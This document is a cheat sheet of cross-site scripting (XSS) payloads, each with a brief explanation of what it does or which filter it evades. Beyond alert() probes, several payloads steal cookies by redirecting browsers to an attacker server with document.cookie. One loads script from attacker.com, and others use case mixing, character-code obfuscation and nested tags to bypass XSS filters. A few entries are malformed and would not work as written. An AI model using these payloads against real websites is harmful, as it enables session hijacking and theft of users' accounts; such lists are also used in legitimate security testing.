<script>alert(1)</script>                         This is the most generic XSS payload. It will generate a popup box if the payload succeeds.
<iframe src=javascript:alert(1)>                  This payload loads JavaScript code within an iframe. It’s useful when <script> tags are banned by the XSS filter.
<body onload=alert(1)>                            This payload is useful when your input string can’t contain the term script. It inserts an HTML element that will run JavaScript automatically after it’s loaded.
"><img src=x onerror=prompt(1);>                  This payload closes out the previous tag. It then injects an <img> tag with an invalid source URL. Once the tag fails to load, it will run the JavaScript specified in the onerror attribute.
<script>alert(1)<!–                               <!- is the start of an HTML comment. This payload will comment out the rest of the line in the HTML document to prevent syntax errors.
<a onmouseover"alert(1)">test</a>                 This payload inserts a link that will cause JavaScript to execute after a user hovers over the link with their cursor.
<script src=//attacker.com/test.js>               This payload causes the browser to load and run an external script hosted on the attacker’s server.
<img src="123" onerror="alert('XSS Bypass');"/>   Bypass XSS Protection
<a href="javascript:alert('XSS Bypass')>Click me!</a>" Bypass XSS Protection
<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>  Bypass XSS Protection
<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47,
47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,
101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT> Bypass XSS Protection
<scrip<script>t>
location='http://attacker_server_ip/c='+document.cookie;
</scrip</script>t>    Bypass XSS Protection                 
